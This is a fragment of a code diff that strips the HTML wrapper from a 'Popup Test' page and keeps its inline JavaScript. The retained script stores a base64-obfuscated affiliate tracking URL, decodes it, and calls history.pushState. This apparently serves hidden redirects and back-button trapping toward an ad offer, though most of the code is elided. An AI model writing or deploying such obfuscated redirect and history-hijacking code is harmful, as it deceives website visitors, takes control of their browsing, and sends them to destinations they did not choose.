@@ -1,15 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Popup Test</title>
-</head>
-<body>
-    <button id="start-script" style="margin: 20px; padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">Start Script</button>
-
-    <script>
-        const excludedLinks = ['/about', '/contact'];
+    const excludedLinks = ['/about', '/contact'];
         const base64Url = 'aHR0cHM6Ly90cmtnZmxvdy5nMmFmc2UuY29tL2NsaWNrP3BpZD0xMyZvZmZlcl9pZD0zMDU3JnN1YjE9YmFzc3dpbg==';
 
         function base64_decode(data) {
@@ -97,6 +86,3 @@
                 history.pushState(null, null, window.location.href);
             });
         });
-    </script>
-</body>
-</html>
